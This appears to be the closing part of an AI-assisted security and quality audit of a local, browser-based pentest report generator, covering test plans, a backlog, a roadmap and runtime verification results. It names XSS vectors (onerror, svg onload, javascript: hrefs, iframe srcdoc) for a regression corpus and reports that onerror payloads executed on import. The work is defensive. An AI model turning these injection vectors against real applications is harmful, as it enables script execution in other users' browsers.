**What:** Formalize the CDP harness used in this audit (`cdp.mjs`: Node ≥22 built-in `WebSocket` plus any installed Chromium-family browser) into `tests/run.mjs`, with assertions and a non-zero exit code on failure. Optionally, Playwright as a *dev-only* dependency for richer APIs. Either way, the shipped app stays dependency-free.

**Cover first:** regression cases for BUG-001 to BUG-012, SEC-001 and SEC-002, and PERF-001.

**Complexity:** Small–Medium **Acceptance:** `node tests/run.mjs` runs in under 30 s and fails on each reintroduced bug.

### [TEST-002] [P1] Export → import round-trip fidelity test

**What:** In a fresh profile, populate every field type, export, reset, import, and deep-compare. Fields to cover:
- dates and classification, including values restored from localStorage (BUG-002)
- tokens (BUG-001)
- watermark
- TOC
- planner flags (BUG-012)
- page breaks
- custom sections and order
- images

**Complexity:** Small

### [TEST-003] [P1] Malformed-input and XSS payload corpus for report and library import

**What:** A corpus of wrong types, missing keys, legacy v1 files, huge files, and HTML/JS payloads (`onerror`, `svg onload`, `javascript:` href, attribute breakout in the logo, `<iframe srcdoc>`).

**Assert:**
- No script executes (a global canary stays unset).
- The report is unchanged after a rejected import (BUG-003).
- Invalid library entries are reported (BUG-006).

**Complexity:** Small

### [TEST-004] [P2] Listener-leak and render-budget tests

**What:**
- Instrument `addEventListener` (as in this audit). After 100 renders and 5 imports, listener counts must equal the counts after load.
- Budget: `renderAll()` with 150 findings must stay under 50 ms on CI hardware (baseline 27 ms here).

**Complexity:** Small

### [TEST-005] [P2] Data and static lint

**What:** A Node script that checks:
- `library.json` schema, unique titles (BUG-014), CWE format, no script-bearing HTML
- `report-defaults.json` has all 9 section ids per template, and `defaultTemplate` exists
- `settings.json` schema
- grep rules: no new `innerHTML = \`…${` without escape or sanitize (ARCH-007), no `prompt(` / `alert(` / `confirm(`

**Complexity:** Small

### [TEST-006] [P3] Print output regression

**What:**
- Use CDP `Page.printToPDF` on a fixture report.
- Assert the page count is stable, findings aren't split (`break-inside`), and the watermark is present when enabled.
- Store a PDF text dump snapshot.

**Complexity:** Medium

### [TEST-007] [P3] Automated accessibility checks

**What:**
- Inject axe-core (dev-only, vendored in `tests/`) into the harness, with zero serious violations on the main screen and each modal.
- Keyboard-only script: open, use and close each modal (UI-001).

**Complexity:** Small

---

## Prioritized Backlog

Ranked by priority, then by impact per unit of effort.

| # | ID | Pri | Description | Rationale | Complexity | Depends on | Expected outcome |
|---|---|---|---|---|---|---|---|
| 1 | ARCH-006 | P1 | Put project under git | Safe, reviewable changes | S | — | History and rollback |
| 2 | BUG-001 | P0 | DOM-based, idempotent token conversion + repair | Corrupts client deliverables | S | — | No `">` artifacts |
| 3 | BUG-010 | P2 | Token values via `textContent` | Same function as BUG-001 | S | BUG-001 | Consistent rendering |
| 4 | SEC-002 | P1 | Escape library list fields | One-line fix, firm-wide blast radius | S | — | No script from library |
| 5 | SEC-001 | P1 | Sanitize rich HTML on import and render; validate logo | Exchanged files execute code | M | ARCH-007 | Imports are safe |
| 6 | BUG-003 | P1 | Validate, snapshot and roll back on import | Prevents total loss | S–M | ARCH-004 | Failed import = no change |
| 7 | BUG-011 | P1 | Matrix null-guard; protect summary block | One click breaks the app; enabler for BUG-003 | S | — | No `renderAll` crash |
| 8 | BUG-002 | P1 | Explicit `meta` in payload | Silent data loss | S | ARCH-004 | Dates and class round-trip |
| 9 | PERF-001 | P1 | Delegate DnD/change listeners once | Unbounded growth | S–M | — | Constant listener count |
| 10 | BUG-005 | P1 | Autosave to IndexedDB + failure banner | Crash recovery actually works | M | — | 20 MB drafts recover |
| 11 | BUG-004 | P2 | Clear autosave on export and import | Misleading prompt | S | — | No stale prompt |
| 12 | TEST-001/002/003 | P1 | Harness, round-trip, malformed/XSS corpus | Lock in the fixes above | S–M | — | Automated regression |
| 13 | ARCH-004 | P2 | `schemaVersion` + validators + migrations | Foundation for safe evolution | S–M | — | Forward-compatible files |
| 14 | BUG-007 | P2 | Status-aware severity counts | Wrong exec numbers | S | — | Correct exec summary |
| 15 | BUG-008 | P2 | Function-based replacement | Silent text mangling | S | — | `$` preserved |
| 16 | BUG-006 | P2 | Normalize library entries | Search breaks | S | — | Robust search |
| 17 | SEC-005 | P3 | Add meta CSP (step 1) | Blocks easy exfiltration | S | — | Defense in depth |
| 18 | SEC-004 / PERF-008 | P3 | SRI or vendor CDN assets | Supply chain, offline use | S | — | Offline-capable UI |
| 19 | UI-001 | P2 | Accessible modals (Escape, focus) | Keyboard and a11y | S–M | — | WCAG-compliant dialogs |
| 20 | UI-003 | P2 | Target-section picker | Workflow friction | S | — | Fewer drags |
| 21 | UI-002 | P2 | Inline asset chip input | Native prompt, bulk paste | S | — | Fast asset entry |
| 22 | PERF-003 + FEAT-005 | P2 | Image compression and store; paste, caption, redact | Weight and evidence workflow | M | BUG-005 | Small reports, better evidence |
| 23 | FEAT-001 | P2 | CVSS 3.1/4.0 calculator | Expected by clients | M | UI-007 | Accurate scoring |
| 24 | UI-005 | P2 | Undo stack + F&R preview | Destructive ops are irreversible | M | BUG-003 | Recoverable mistakes |
| 25 | ARCH-003 | P2 | Stable finding ids | Enables retest, diff, partial render | M | — | Robust references |
| 26 | FEAT-004 | P2 | Retest workflow | Consultancy core cycle | M | ARCH-003, BUG-007 | Retest reports in minutes |
| 27 | FEAT-002 | P2 | Scanner import (Nessus, Burp first) | Biggest time saver | L | ARCH-003, SEC-001 | Drafts from scans |
| 28 | UI-004 | P2 | Better library search | Discoverability | S–M | BUG-014 | Find templates faster |
| 29 | ARCH-007 | P2 | Escape-by-default templating | Prevents future XSS | M | — | Fewer injection sinks |
| 30 | BUG-009, BUG-012, BUG-013, BUG-014 | P3 | Title prefix, planner flag, live commit, library dups | Correctness polish | S | — | Fewer surprises |
| 31 | PERF-002, PERF-005, PERF-006, PERF-007 | P3 | Lazy library, revoke URLs, keep logo bytes, rAF drag | Cheap wins | S | — | Lower memory and network use |
| 32 | UI-006, UI-007, UI-008, UI-009 | P3 | Mobile layout, CVSS reconciliation, file names, save status | UX polish | S | FEAT-001 for UI-007 | Clearer UX |
| 33 | SEC-003 + FEAT-010 | P2/P3 | Storage hygiene + encrypted files | Confidentiality | M | BUG-004, BUG-005 | Encrypted at rest |
| 34 | FEAT-007, FEAT-008, FEAT-011, FEAT-009 | P3–P4 | Spellcheck/lang, severity sort, CSV export, charts | Productivity | S–M | — | Polished deliverables |
| 35 | ARCH-001, ARCH-002, ARCH-005, PERF-004 | P2–P3 | Delegated actions, document model, editor normalization, targeted render | Long-term maintainability | L | TEST suite | Maintainable codebase |
| 36 | FEAT-003, FEAT-006 | P3 | Word export, custom fields | Market fit | M | ARCH-002 | Broader adoption |
| 37 | TEST-004 to TEST-007, SEC-006 | P2–P4 | Perf/leak, lint, print, a11y tests; referrer | Quality gates | S–M | TEST-001 | Sustained quality |
| — | FEAT-012 | P4 | Real-time collaboration: **not recommended** | Breaks the core wedge | VL | — | Offer file merge instead |

---

## Implementation Roadmap

**Stage 0: Safety net (½ day)**
- **IDs:** ARCH-006, TEST-001 (harness skeleton)
- **Files:** new `tests/run.mjs` and `tests/fixtures/*`; `.gitignore`
- **Completion:** repo initialized; the harness opens the app and runs one passing smoke test.

**Stage 1: Data integrity and critical security (1–2 days)**
- **IDs:** BUG-001, BUG-010, BUG-002, BUG-003, BUG-011, BUG-004, SEC-001, SEC-002, ARCH-004 (minimal: version + validators), TEST-002, TEST-003
- **Files:** `rapportgenerator.html`, specifically:
  - `convertLiteralTokensToSpans`
  - `buildReportPayload` / `applyReportPayload` / `importReportJson`
  - `exportReportJson`
  - `createMatrix`
  - `filterLibrary`
  - `renderAll` (the sanitize hook)
  - new `sanitizeHtml`
  - `renderLogo`
- **Order:** BUG-001 → SEC-002 → ARCH-004 validators → BUG-003 → BUG-002 → SEC-001 → BUG-004
- **Regression risks:**
  - The sanitizer may strip legitimate formatting, so test with all 270 library templates and the 7 assessment templates.
  - Old report files must still import (v1 migration).
- **Completion:**
  - TEST-002 and TEST-003 pass.
  - All 270 templates render identically, as a text snapshot, before and after.
  - The XSS corpus does not execute.

**Stage 2: Reliability and performance (1–2 days)**
- **IDs:** PERF-001, PERF-007, BUG-005, PERF-003 (compression part), PERF-005, PERF-006, PERF-002, BUG-013, TEST-004
- **Files:** drag/drop setup functions, `init`, autosave block (IndexedDB), `insertImageFromToolbar`, `loadImageAsDataUrl`, download helpers
- **Risks:**
  - Drag/drop behavior changes, so verify both section and finding drags, including cross-section moves.
  - IndexedDB is unavailable in some private modes, so fall back to localStorage or a visible warning.
- **Completion:** listener counts stay constant (TEST-004); a 20 MB report autosaves and restores; renderAll stays under 50 ms at 150 findings.

**Stage 3: Correctness polish and architecture seams (2–3 days)**
- **IDs:** BUG-006, BUG-007, BUG-008, BUG-009, BUG-012, BUG-014, ARCH-003, ARCH-007, SEC-004, SEC-005 (step 1), PERF-008, TEST-005
- **Risks:**
  - Adding ids changes the export format (covered by ARCH-004 migrations).
  - The CSP may block a needed resource, so test fully on GitHub Pages.
- **Completion:** the lint passes; the CSP is active with no violations during normal use.

**Stage 4: UI/UX (2–3 days)**
- **IDs:** UI-001, UI-002, UI-003, UI-004, UI-005, UI-006, UI-008, UI-009, TEST-007
- **Risks:** Moving to `<dialog>` affects all modal CSS, and the undo stack's memory use with images (do Stage 2 first).
- **Completion:** axe reports no serious violations; keyboard-only flows work; there is no horizontal scroll at 360 px.

**Stage 5: Competitive features (incremental, each independently shippable)**
- **Order:**
  1. FEAT-001 (CVSS) with UI-007
  2. FEAT-005 (evidence)
  3. FEAT-004 (retest)
  4. FEAT-008
  5. FEAT-007
  6. FEAT-002 (scanner import: Nessus, then Burp, Nmap, ZAP)
  7. FEAT-010 + SEC-003
  8. FEAT-011
  9. FEAT-003
  10. FEAT-006
  11. FEAT-009
- **Completion:** each feature's acceptance criteria are met, with harness tests.

**Stage 6: Long-term architecture and final validation**
- **IDs:** ARCH-001, ARCH-002, ARCH-005, PERF-004, TEST-006, SEC-005 (step 2: strict CSP)
- **Approach:** migrate area by area behind the test suite; never as a big-bang rewrite.

---

## Verification Results

**Environment:**
- macOS (Darwin 27.0.0), Node v26.9.0, Python 3 `http.server` on `127.0.0.1:8080`.
- Headless **Microsoft Edge 156.0.4314.58**, driven over the Chrome DevTools Protocol from a throwaway browser profile.
- Playwright's MCP server could not be used: Google Chrome is not installed, and per the instructions nothing was installed.

**Commands and tools actually run:**

| Step | Command / tool | Result |
|---|---|---|
| Serve app | `python3 -m http.server 8080 --bind 127.0.0.1` | 200 for HTML and all 3 JSON files |
| JS syntax | `sed -n '1045,2904p' rapportgenerator.html > app.js && node --check app.js` | **syntax OK** |
| Static scan | Python regex scan | 0 duplicate static ids; 153 inline `on*` handlers; 3 `createObjectURL` / 0 `revokeObjectURL`; 2 `execCommand`; 2 native `prompt()`; 1 `@media print` block |
| Data lint | Python over `library.json` | 270 entries, all keys present, all `CWE-N`, 270 contain `[CLIENT NAME]`, 7 contain HTML, 7 duplicate titles |
| Runtime tests | one-off CDP scripts (since turned into `tests/cases.mjs`) | Results cited per finding; summary below |
| Screenshots | `cdp.mjs` → `shot-desktop-sidebar.png`, `shot-mobile.png` | UI-006 evidence |
| Competitive research | WebFetch / WebSearch (GitHub, vendor docs) | Sources cited in COMP-001 to COMP-006 |

**Runtime test summary:**

| Test | Finding | Observed |
|---|---|---|
| t3 T1, t4 | BUG-001 | `Thanks to [CLIENT NAME]">[CLIENT NAME].`; `For Acme Corp">Acme Corp` |
| t2 T4 | BUG-002 | UI start `2026-10-01`, export `exportHasStartDate:false`, `exportHasClassificationSelected:false` |
| t2 T7 | BUG-003 | sections 12 → 1, `TypeError: Cannot set properties of null` |
| t2 T13 | BUG-004 | `autosaveStillPresent:true` after export |
| t3 T9 | BUG-005 | 3 MB stored, 5/7/9 MB **not** stored |
| t2 T5 | BUG-006 | `TypeError … reading 'toLowerCase'`, 0 results |
| t1 T12 | BUG-007 | False Positive 5×5 → Critical count 1, 1 matrix dot |
| t1 T3 | BUG-008 | `US$&` → "Price USX" |
| t1 T8 | BUG-009 | `802.1X not enforced` → `1X not enforced` |
| t1 T10 | BUG-010 | `<b>` element created from client name |
| t3 T16, t7 | BUG-011 | `TypeError` in `createMatrix` when `#matrix` is absent; deleting Findings Summary throws in `removeSection` |
| t3 T15 | BUG-012, PERF-001 | payload lacks planner flag; change listeners 2 → 5, dragover 1 → 4 after 3 imports; 4 `renderChecklist` calls per date change |
| t2 T2 | PERF-001 | findings-container dragover listeners 1 → 51 after 50 renders |
| t2 T6 | PERF table | 7.2 / 20.0 / 27.3 ms per `renderAll` (10/50/150 findings); 47.4 ms with 4.5 MB images |
| t1 T11 | SEC-001 | `onerror` in description executed |
| t1 T5b | SEC-002 | `onerror` in library title executed |
| t3 T17 | UI-001 | modal still open after Escape |
| t6 | UI-006 | `scrollWidth` 434 at 390 px viewport |

**One hypothesis disproved:** I initially suspected that the default narrative sections are corrupted on every focusout. They are not, because the shipped defaults contain token spans *without* `data-placeholder` (`t1.js` T1: unchanged after two blurs). The corruption only affects spans the app creates itself (BUG-001).

**Limitations:**
- No Core Web Vitals field data; LCP, INP and CLS were not measured.
- Drag latency under listener accumulation was inferred from listener counts, not profiled.
- Focus events in headless mode were partially simulated by calling the elements' `onblur` handlers directly. That is the exact code path the browser invokes.
- Print/PDF output was not generated or inspected.
- No dependency vulnerability scanner applies, since there are no packages; the CDN versions are Bootstrap 5.3.0 and Bootstrap Icons 1.11.3.
- Competitor information comes from public pages, not hands-on use. Tier details (SysReptor) and connector counts (Faraday) vary between sources.
- Prior-knowledge claims are labelled as such (COMP-007).

---

## Final Assessment

**Biggest weaknesses**
- The persistence and edit pipeline relies on string-level HTML manipulation and on the DOM as state. That single design choice produces most of the confirmed defects: token corruption (BUG-001), lost metadata (BUG-002), destructive failed imports (BUG-003), and script execution from shared files (SEC-001, SEC-002).
- There are no tests to catch any of them.

**Most important opportunities**
- Lean into the unique **zero-infrastructure, data-stays-local** position (COMP-007): no competitor reviewed offers it.
- Then close the most visible feature gaps that fit it: in-browser CVSS calculation (FEAT-001), evidence handling (FEAT-005), retests (FEAT-004), client-side scanner import (FEAT-002) and encrypted files (FEAT-010).

**Highest-impact fixes:** BUG-001, then SEC-002 / SEC-001, then BUG-003 / BUG-002, then PERF-001, then BUG-005. All are Small to Medium, all are localized to a handful of functions, and together they make the app trustworthy for real client deliverables.

**Features most likely to improve competitiveness:** FEAT-001 (CVSS), FEAT-002 (scanner import), FEAT-004 (retest), FEAT-005 (evidence), FEAT-010 (encryption).

**What to implement first:** Stage 0 (git and the test harness), then Stage 1 in this order: BUG-001 → SEC-002 → ARCH-004 validators → BUG-003 → BUG-002 → SEC-001 → BUG-004. Each step can be verified independently with the test scripts from this audit.
